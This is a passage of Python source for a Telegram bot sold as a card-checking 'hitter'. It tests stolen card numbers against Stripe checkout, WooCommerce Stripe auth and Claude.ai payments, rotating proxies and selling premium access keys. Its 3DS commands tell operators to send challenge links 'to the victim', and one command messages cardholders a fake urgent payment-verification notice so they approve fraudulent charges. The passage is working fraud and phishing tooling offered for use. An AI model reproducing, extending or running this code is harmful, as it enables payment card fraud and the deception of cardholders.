    markup.add(KeyboardButton("🔒 SOCKS4 PROXY"), KeyboardButton("🏠 RESIDENTIAL PROXY"))
    markup.add(KeyboardButton("🔄 ANY PROXY"), KeyboardButton("🔄 AUTO ROTATE"))
    markup.add(KeyboardButton("📁 LOAD PROXY FILE"), KeyboardButton("📝 ADD SINGLE PROXY"))
    markup.add(KeyboardButton("⏩ NO PROXY"), KeyboardButton("🔙 BACK"))
    return markup

def get_back_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("🔙 BACK"))
    return markup

# ==================== COMMANDS ====================

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned from using this bot.")
        return
    
    clear_session(user_id)
    
    if is_admin(user_id):
        role = "ADMIN 👑"
        limit = "UNLIMITED"
    elif is_premium(user_id):
        role = "PREMIUM 💎"
        limit = "UNLIMITED"
    else:
        role = "FREE 🆓"
        limit = f"{get_checks_left(user_id)}/10"
    
    proxy_count = sum(len(proxy_list[t]) for t in proxy_list)
    
    welcome_text = f"""
╔══════════════════════════════════════╗
║     🔥 HAMZZY ULTIMATE HITTER 🔥     ║
╠══════════════════════════════════════╣
║  👤 User: {message.from_user.first_name}
║  💎 Role: {role}
║  📊 Checks Left: {limit}
║  🌐 Proxies Loaded: {proxy_count}
╠══════════════════════════════════════╣
║  Gateways:                          ║
║  • Stripe Checkout (Best)           ║
║  • Stripe Auth (WooCommerce)        ║
║  • Claude.ai (Subscription)         ║
╠══════════════════════════════════════╣
║  Commands:                          ║
║  /check - Start interactive check   ║
║  /mchk - Continue mass check        ║
║  /all - Check ALL gateways          ║
║  /stop - Stop mass check            ║
║  /redeem - Redeem premium key       ║
║  /buy - Premium info                ║
║  /status - Your stats               ║
║  /3ds_list - List 3DS jobs          ║
║  /3ds_check - Check 3DS status      ║
║  /admin - Admin panel (admin only)  ║
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket                    ║
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, welcome_text, reply_markup=get_main_keyboard())

@bot.message_handler(commands=['check'])
def check_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    session = get_session(user_id)
    session["step"] = "gateway"
    
    bot.reply_to(message, "📌 **SELECT GATEWAY**\n\nChoose which gateway to use:", reply_markup=get_gateway_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['mchk'])
def mchk_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    session = get_session(user_id)
    
    if not session.get("cards"):
        bot.reply_to(message, "❌ No cards loaded. Use /check to start a new session.")
        return
    
    if session.get("gateway") == "stripe_checkout" and not session.get("checkout_url"):
        bot.reply_to(message, "❌ No checkout URL set. Please provide the checkout URL:")
        bot.register_next_step_handler(message, handle_checkout_url, user_id, session)
        return
    
    start_checking(message, user_id, session)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    parts = message.text.split()
    job_id = parts[1] if len(parts) > 1 else None
    
    stopped = False
    for jid, job in mass_jobs.items():
        if job.get("user_id") == user_id and job.get("active", False):
            if job_id and jid != job_id:
                continue
            job["active"] = False
            stopped = True
            bot.reply_to(message, f"✅ Mass check stopped for job {jid}" if job_id else "✅ Mass check stopped.")
            break
    
    if not stopped:
        bot.reply_to(message, "ℹ️ No active mass check found." if not job_id else f"❌ Job {job_id} not found.")

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    msg = bot.reply_to(message, "🔑 Please enter your premium key:")
    bot.register_next_step_handler(msg, process_redeem)

def process_redeem(message):
    user_id = message.from_user.id
    key = message.text.strip()
    
    success, msg = redeem_key(user_id, key)
    
    if success:
        bot.reply_to(message, f"✅ {msg}\n\nYou now have PREMIUM access!")
    else:
        bot.reply_to(message, f"❌ {msg}")

@bot.message_handler(commands=['buy'])
def buy_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    response = """
╔══════════════════════════════════════╗
║           💎 GET PREMIUM             ║
╠══════════════════════════════════════╣
║  Premium Features:                  ║
║  • Unlimited checks                  ║
║  • Proxy support                     ║
║  • 3DS forwarding                    ║
║  • Mass check                        ║
║  • /all command                      ║
║  • Priority support                  ║
╠══════════════════════════════════════╣
║  Price: Contact @hamzzyhacket        ║
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if is_admin(user_id):
        role = "ADMIN 👑"
        limit = "UNLIMITED"
    elif is_premium(user_id):
        role = "PREMIUM 💎"
        limit = "UNLIMITED"
    else:
        role = "FREE 🆓"
        limit = f"{get_checks_left(user_id)}/10"
    
    response = f"""
╔══════════════════════════════════════╗
║           📊 USER STATUS             ║
╠══════════════════════════════════════╣
║  👤 User ID: {user_id}
║  💎 Role: {role}
║  📊 Checks Left: {limit}
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def help_command(message):
    start_command(message)

# ==================== /all COMMAND ====================

@bot.message_handler(commands=['all'])
def all_gateways_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        checks_left = get_checks_left(user_id)
        if isinstance(checks_left, int) and checks_left <= 0:
            bot.reply_to(message, "❌ You have used all your free checks. Use /buy to get premium.")
            return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Usage: /all CC|MM|YY|CVV <checkout_url>\n\nExample: /all 4147201234567890|12|28|123 https://pay.krea.ai/c/pay/cs_live_xxx")
            return
        
        card_string = parts[1]
        checkout_url = parts[2]
        
        card = parse_card_string(card_string)
        if not card:
            bot.reply_to(message, "❌ Invalid card format. Use: CC|MM|YY|CVV")
            return
        
        msg = bot.reply_to(message, "⏳ **CHECKING ALL GATEWAYS...**\n\n🔄 Stripe Checkout...", parse_mode="Markdown")
        
        results = {}
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # 1. Stripe Checkout
        result = loop.run_until_complete(stripe_checkout.charge(card, checkout_url, None))
        results["Stripe Checkout"] = result
        bot.edit_message_text(f"⏳ **CHECKING ALL GATEWAYS...**\n\n✅ Stripe Checkout: {result['status']}\n🔄 Stripe Auth...", message.chat.id, msg.message_id)
        
        # 2. Stripe Auth
        result = loop.run_until_complete(stripe_auth.check_card(card, None))
        results["Stripe Auth"] = result
        bot.edit_message_text(f"⏳ **CHECKING ALL GATEWAYS...**\n\n✅ Stripe Checkout: {results['Stripe Checkout']['status']}\n✅ Stripe Auth: {result['status']}\n🔄 Claude.ai...", message.chat.id, msg.message_id)
        
        # 3. Claude.ai
        result = loop.run_until_complete(claude_checker.check_card(card, None))
        results["Claude.ai"] = result
        
        loop.close()
        
        # Add check count for free users
        if not is_admin(user_id) and not is_premium(user_id):
            add_check_count(user_id)
        
        # Find best result
        best = None
        priority = ["CHARGED", "APPROVED", "LIVE", "3DS", "DECLINED"]
        for p in priority:
            for gateway, r in results.items():
                if r.get("status") == p:
                    best = {"gateway": gateway, "status": p, "message": r.get("message"), "amount": r.get("amount")}
                    break
            if best:
                break
        
        response = f"""
╔══════════════════════════════════════╗
║         🔥 ALL GATEWAYS RESULT       ║
╠══════════════════════════════════════╣
║  💳 Card: `{card['full']}`
╠══════════════════════════════════════╣
"""
        for gateway, r in results.items():
            emoji = "✅" if r['status'] in ['CHARGED','APPROVED'] else "💳" if r['status'] == 'LIVE' else "🔐" if r['status'] == '3DS' else "❌"
            response += f"║  {emoji} {gateway:<14} → {r['status']:<10}\n"
            response += f"║     └─ {r.get('message', '')[:35]}\n"
        
        response += f"""
╠══════════════════════════════════════╣
║  🏆 BEST: {best['gateway']} - {best['status']}
║  💵 Amount: {best.get('amount', 'N/A')}
╚══════════════════════════════════════╝
👑 @hamzzyhacket
"""
        
        # Save best result
        save_result(card["full"], best["status"], best.get("message", ""), best.get("amount", ""), best["gateway"])
        
        bot.edit_message_text(response, message.chat.id, msg.message_id, parse_mode="Markdown")
        
        # Handle 3DS
        for gateway, r in results.items():
            if r.get("status") == "3DS" and r.get("challenge_url"):
                job_id = f"3DS_{int(time.time())}_{user_id}_{gateway.replace(' ', '_')}"
                pending_3ds[job_id] = {
                    "card": card["full"],
                    "url": r["challenge_url"],
                    "amount": r.get("amount", "N/A"),
                    "gateway": gateway,
                    "user_id": user_id,
                    "created": time.time()
                }
                bot.send_message(user_id, f"⚠️ **3DS DETECTED on {gateway}!**\n📌 Job ID: `{job_id}`\nUse `/3ds_getlink {job_id}`")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== PROXY COMMANDS ====================

@bot.message_handler(commands=['add_proxy'])
def add_proxy_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    msg = bot.reply_to(message, "📝 **ADD PROXY**\n\nSend proxy in any format:\n• `host:port`\n• `user:pass@host:port`\n• `host:port:user:pass`\n• `socks5://user:pass@host:port`\n\nOr send a .txt file with proxies.", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_add_proxy)

def process_add_proxy(message):
    user_id = message.from_user.id
    
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_content = downloaded_file.decode('utf-8', errors='ignore')
            
            count = 0
            for line in file_content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    success, ptype = add_proxy_from_text(line)
                    if success:
                        count += 1
            
            bot.reply_to(message, f"✅ Added {count} proxies from file!")
            
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        proxy_text = message.text.strip()
        success, ptype = add_proxy_from_text(proxy_text)
        
        if success:
            bot.reply_to(message, f"✅ Proxy added to {ptype.upper()} list!")
        else:
            bot.reply_to(message, "❌ Invalid proxy format.")

@bot.message_handler(commands=['list_proxy'])
def list_proxy_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    response = f"""
╔══════════════════════════════════════╗
║           📡 PROXY LIST              ║
╠══════════════════════════════════════╣
║  🌐 HTTP: {len(proxy_list['http'])}
║  🔒 SOCKS5: {len(proxy_list['socks5'])}
║  🔒 SOCKS4: {len(proxy_list['socks4'])}
║  🏠 RESIDENTIAL: {len(proxy_list['residential'])}
╠══════════════════════════════════════╣
║  Commands:                          ║
║  /add_proxy - Add proxy(es)         ║
║  /clear_proxy - Clear all proxies   ║
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['clear_proxy'])
def clear_proxy_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    for ptype in proxy_list:
        proxy_list[ptype] = []
    
    for f in [PROXY_HTTP_FILE, PROXY_SOCKS4_FILE, PROXY_SOCKS5_FILE, PROXY_RESIDENTIAL_FILE]:
        if os.path.exists(f):
            os.remove(f)
    
    bot.reply_to(message, "✅ All proxies cleared!")

# ==================== 3DS COMMANDS ====================

@bot.message_handler(commands=['3ds_list'])
def threeds_list_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    if not pending_3ds:
        bot.reply_to(message, "ℹ️ No pending 3DS jobs.")
        return
    
    response = "╔══════════════════════════════════════╗\n"
    response += "║           🔐 PENDING 3DS JOBS        ║\n"
    response += "╠══════════════════════════════════════╣\n"
    
    for job_id, job in list(pending_3ds.items())[:10]:
        response += f"║  📌 ID: {job_id}\n"
        response += f"║  💳 Card: {job.get('card', 'Unknown')[:25]}...\n"
        response += f"║  💵 Amount: {job.get('amount', 'N/A')}\n"
        response += f"║  ──────────────────────────────── ║\n"
    
    response += "╠══════════════════════════════════════╣\n"
    response += "║  Commands:                          ║\n"
    response += "║  /3ds_getlink <id> - Get URL        ║\n"
    response += "║  /3ds_telegram <id> <@username>     ║\n"
    response += "║  /3ds_check <id> - Check status     ║\n"
    response += "║  /3ds_cancel <id> - Cancel job      ║\n"
    response += "╠══════════════════════════════════════╣\n"
    response += "║  👑 @hamzzyhacket                    ║\n"
    response += "╚══════════════════════════════════════╝"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['3ds_getlink'])
def threeds_getlink_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /3ds_getlink <job_id>")
            return
        
        job_id = parts[1]
        
        if job_id not in pending_3ds:
            bot.reply_to(message, "❌ Job not found")
            return
        
        job = pending_3ds[job_id]
        challenge_url = job.get("url", "")
        
        response = f"""
🔗 **3DS CHALLENGE URL**

📌 Job ID: `{job_id}`
💳 Card: {job.get('card', 'Unknown')}
💰 Amount: {job.get('amount', 'N/A')}
🏦 Gateway: {job.get('gateway', 'Unknown')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Send this link to the victim:**

`{challenge_url}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Instructions:
1. Copy the link above
2. Send to victim via Telegram/SMS/WhatsApp
3. Victim clicks and authenticates
4. Payment will go through automatically

👑 @hamzzyhacket
"""
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['3ds_telegram'])
def threeds_telegram_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Usage: /3ds_telegram <job_id> <@username>")
            return
        
        job_id = parts[1]
        victim_username = parts[2]
        
        if not victim_username.startswith("@"):
            victim_username = "@" + victim_username
        
        if job_id not in pending_3ds:
            bot.reply_to(message, "❌ Job not found")
            return
        
        job = pending_3ds[job_id]
        challenge_url = job.get("url", "")
        
        victim_message = f"""
⚠️ **URGENT: Payment Verification Required**

A transaction of **{job.get('amount', 'N/A')}** was attempted at **{job.get('gateway', 'Unknown')}**.

To verify this transaction, click the link below:

🔗 [Click Here to Verify]({challenge_url})

If you did not make this transaction, please ignore this message.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_This is an automated verification message._
"""
        
        try:
            bot.send_message(victim_username, victim_message, parse_mode="Markdown", disable_web_page_preview=True)
            bot.reply_to(message, f"✅ 3DS link sent to {victim_username}\n📌 Job ID: {job_id}")
            pending_3ds[job_id]["telegram_sent"] = True
        except Exception as e:
            bot.reply_to(message, f"❌ Could not send: {str(e)}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['3ds_check'])
def threeds_check_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /3ds_check <job_id>")
            return
        
        job_id = parts[1]
        
        if job_id not in pending_3ds:
            bot.reply_to(message, "❌ Job not found")
            return
        
        msg = bot.reply_to(message, f"⏳ Checking 3DS status for {job_id}...")
        
        job = pending_3ds[job_id]
        telegram_sent = job.get("telegram_sent", False)
        
        response = f"""
📊 **3DS JOB STATUS**

📌 Job ID: `{job_id}`
💳 Card: {job.get('card', 'Unknown')}
💰 Amount: {job.get('amount', 'N/A')}
🏦 Gateway: {job.get('gateway', 'Unknown')}
📅 Created: {datetime.fromtimestamp(job.get('created', time.time())).strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 Telegram Sent: {'✅ Yes' if telegram_sent else '❌ No'}
🔗 Challenge URL: {job.get('url', 'N/A')[:60]}...

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 The victim must click the link and complete authentication.
Once completed, the payment will go through automatically.

👑 @hamzzyhacket
"""
        bot.edit_message_text(response, message.chat.id, msg.message_id, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['3ds_cancel'])
def threeds_cancel_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /3ds_cancel <job_id>")
            return
        
        job_id = parts[1]
        
        if job_id in pending_3ds:
            del pending_3ds[job_id]
            bot.reply_to(message, f"✅ Job {job_id} cancelled")
        else:
            bot.reply_to(message, "❌ Job not found")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== ADMIN PANEL ====================

@bot.message_handler(commands=['admin'])
def admin_panel_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "❌ You are banned.")
        return
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ **ACCESS DENIED**\n\nYou are not authorized to use the admin panel.\n\nContact @hamzzyhacket for access.", parse_mode="Markdown")
        return
    
    admin_text = """
╔══════════════════════════════════════════════════════════════════╗
║                    👑 ADMIN CONTROL PANEL                       ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  📊 **STATISTICS**                                               ║
║  ├─ /stats - View full bot statistics                          ║
║  ├─ /users - List all users                                    ║
║  └─ /premium_list - List premium users                         ║
║                                                                  ║
║  🔑 **KEY MANAGEMENT**                                          ║
║  ├─ /genkey <days> <uses> - Generate premium key               ║
║  ├─ /keys - List all keys                                      ║
║  ├─ /delkey <key> - Delete a key                               ║
║  └─ /key_info <key> - Get key info                             ║
║                                                                  ║
║  👤 **USER MANAGEMENT**                                         ║
║  ├─ /addpremium <user_id> <days> - Add premium                 ║
║  ├─ /rmpremium <user_id> - Remove premium                      ║
║  ├─ /user_info <user_id> - Get user info                       ║
║  ├─ /ban <user_id> <days> - Ban user                           ║
║  └─ /unban <user_id> - Unban user                              ║
║                                                                  ║
║  🌐 **PROXY MANAGEMENT**                                        ║
║  ├─ /proxy_list - List loaded proxies                          ║
║  ├─ /proxy_clear - Clear all proxies                           ║
║  ├─ /proxy_add - Add proxy manually                            ║
║  └─ /proxy_test <proxy> - Test a proxy                         ║
║                                                                  ║
║  📢 **BROADCAST**                                               ║
║  ├─ /broadcast <msg> - Broadcast to all users                  ║
║  └─ /broadcast_premium <msg> - Broadcast to premium only       ║
║                                                                  ║
║  ⚙️ **BOT SETTINGS**                                            ║
║  ├─ /restart - Restart bot (admin only)                        ║
║  ├─ /myid - Get your Telegram ID                               ║
║  └─ /clear_data - Clear all data files                         ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  👑 @hamzzyhacket                                                ║
╚══════════════════════════════════════════════════════════════════╝
"""
    bot.reply_to(message, admin_text, parse_mode="Markdown")

@bot.message_handler(commands=['users'])
def users_list_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    if not users:
        bot.reply_to(message, "ℹ️ No users found.")
        return
    
    response = "╔══════════════════════════════════════╗\n"
    response += "║           👥 ALL USERS              ║\n"
    response += "╠══════════════════════════════════════╣\n"
    
    for uid, data in list(users.items())[:30]:
        premium = "✅" if data.get("premium", False) else "❌"
        expires = data.get("expires", 0)
        if expires > 0:
            exp_date = datetime.fromtimestamp(expires).strftime("%Y-%m-%d")
        else:
            exp_date = "Lifetime" if data.get("premium", False) else "N/A"
        response += f"║  {uid} | Premium: {premium} | Exp: {exp_date}\n"
    
    if len(users) > 30:
        response += f"║  ... and {len(users) - 30} more\n"
    response += "╠══════════════════════════════════════╣\n"
    response += "║  👑 @hamzzyhacket                    ║\n"
    response += "╚══════════════════════════════════════╝"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['premium_list'])
def premium_list_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    premium_users = []
    for uid, data in users.items():
        if data.get("premium", False):
            expires = data.get("expires", 0)
            exp_date = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M") if expires > 0 else "Lifetime"
            premium_users.append(f"║  {uid} | Expires: {exp_date}")
    
    if not premium_users:
        bot.reply_to(message, "ℹ️ No premium users.")
        return
    
    response = "╔══════════════════════════════════════╗\n"
    response += "║         👑 PREMIUM USERS            ║\n"
    response += "╠══════════════════════════════════════╣\n"
    
    for pu in premium_users[:20]:
        response += f"{pu}\n"
    
    if len(premium_users) > 20:
        response += f"║  ... and {len(premium_users) - 20} more\n"
    response += "╠══════════════════════════════════════╣\n"
    response += "║  👑 @hamzzyhacket                    ║\n"
    response += "╚══════════════════════════════════════╝"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['delkey'])
def delete_key_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /delkey <key>")
            return
        
        key = parts[1].upper()
        
        if key in keys:
            del keys[key]
            save_keys()
            bot.reply_to(message, f"✅ Key `{key}` deleted.", parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❌ Key `{key}` not found.", parse_mode="Markdown")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['key_info'])
def key_info_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /key_info <key>")
            return
        
        key = parts[1].upper()
        
        if key not in keys:
            bot.reply_to(message, f"❌ Key `{key}` not found.", parse_mode="Markdown")
            return
        
        data = keys[key]
        status = "✅ Active" if data.get("active", True) else "❌ Used"
        created = datetime.fromtimestamp(data.get("created", time.time())).strftime("%Y-%m-%d %H:%M")
        
        response = f"""
╔══════════════════════════════════════╗
║           🔑 KEY INFO                ║
╠══════════════════════════════════════╣
║  🔑 Key: `{key}`
║  📅 Duration: {data['duration']} days
║  🔄 Max Uses: {data['max_uses']}
║  📊 Used: {data.get('used', 0)} times
║  📌 Status: {status}
║  🕒 Created: {created}
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['user_info'])
def user_info_admin_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /user_info <user_id>")
            return
        
        target_id = parts[1]
        
        if target_id not in users:
            bot.reply_to(message, f"❌ User {target_id} not found.")
            return
        
        data = users[target_id]
        premium = data.get("premium", False)
        checks = data.get("checks", 0)
        expires = data.get("expires", 0)
        
        if expires > 0:
            exp_date = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M")
        else:
            exp_date = "Lifetime" if premium else "N/A"
        
        response = f"""
╔══════════════════════════════════════╗
║           👤 USER INFO               ║
╠══════════════════════════════════════╣
║  🆔 User ID: {target_id}
║  💎 Premium: {'✅ Yes' if premium else '❌ No'}
║  📊 Checks Used: {checks}
║  📅 Expires: {exp_date}
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
        bot.reply_to(message, response)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['ban'])
def ban_user_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /ban <user_id> [days]\n\nExample: /ban 123456789 30")
            return
        
        target_id = parts[1]
        days = int(parts[2]) if len(parts) > 2 else 0
        
        expires = time.time() + (days * 86400) if days > 0 else 0
        
        # Add to banned file
        with open(BANNED_FILE, 'a') as f:
            f.write(f"{target_id}|{expires}\n")
        
        bot.reply_to(message, f"✅ User {target_id} banned for {days} days" if days > 0 else f"✅ User {target_id} banned permanently")
        
        try:
            bot.send_message(int(target_id), f"❌ You have been banned from using this bot for {days} days." if days > 0 else "❌ You have been permanently banned from using this bot.")
        except:
            pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unban'])
def unban_user_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /unban <user_id>")
            return
        
        target_id = parts[1]
        
        if os.path.exists(BANNED_FILE):
            with open(BANNED_FILE, 'r') as f:
                lines = f.readlines()
            with open(BANNED_FILE, 'w') as f:
                for line in lines:
                    if not line.startswith(target_id):
                        f.write(line)
        
        bot.reply_to(message, f"✅ User {target_id} unbanned")
        
        try:
            bot.send_message(int(target_id), "✅ You have been unbanned. You can now use the bot again.")
        except:
            pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['broadcast_premium'])
def broadcast_premium_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        msg_text = message.text.replace('/broadcast_premium ', '')
        if not msg_text or msg_text == '/broadcast_premium':
            bot.reply_to(message, "❌ Usage: /broadcast_premium <message>")
            return
        
        sent = 0
        for uid, data in users.items():
            if data.get("premium", False):
                try:
                    bot.send_message(int(uid), f"📢 **PREMIUM BROADCAST**\n\n{msg_text}", parse_mode="Markdown")
                    sent += 1
                except:
                    pass
        
        bot.reply_to(message, f"✅ Broadcast sent to {sent} premium users")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['proxy_test'])
def proxy_test_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /proxy_test <proxy>")
            return
        
        proxy_string = parts[1]
        proxy = parse_proxy(proxy_string)
        
        if not proxy:
            bot.reply_to(message, "❌ Invalid proxy format.")
            return
        
        msg = bot.reply_to(message, f"⏳ Testing proxy: {proxy.get('url', 'N/A')[:50]}...")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def test():
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                try:
                    start = time.time()
                    async with session.get("https://httpbin.org/ip", proxy=proxy.get("url"), timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        latency = (time.time() - start) * 1000
                        if resp.status == 200:
                            return {"alive": True, "latency": latency}
                except:
                    pass
                return {"alive": False}
        
        result = loop.run_until_complete(test())
        loop.close()
        
        if result.get("alive"):
            bot.edit_message_text(f"✅ Proxy is ALIVE!\n📡 Latency: {result['latency']:.0f}ms", message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Proxy is DEAD or unreachable.", message.chat.id, msg.message_id)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['proxy_add'])
def proxy_add_admin_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    msg = bot.reply_to(message, "📝 **ADD PROXY**\n\nSend proxy in format:\n• `host:port`\n• `user:pass@host:port`\n• `host:port:user:pass`\n• `socks5://user:pass@host:port`\n\nOr send a .txt file.", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_admin_add_proxy)

def process_admin_add_proxy(message):
    user_id = message.from_user.id
    
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_content = downloaded_file.decode('utf-8', errors='ignore')
            
            count = 0
            for line in file_content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    success, ptype = add_proxy_from_text(line)
                    if success:
                        count += 1
            
            bot.reply_to(message, f"✅ Added {count} proxies!")
            
        except Exception as e:
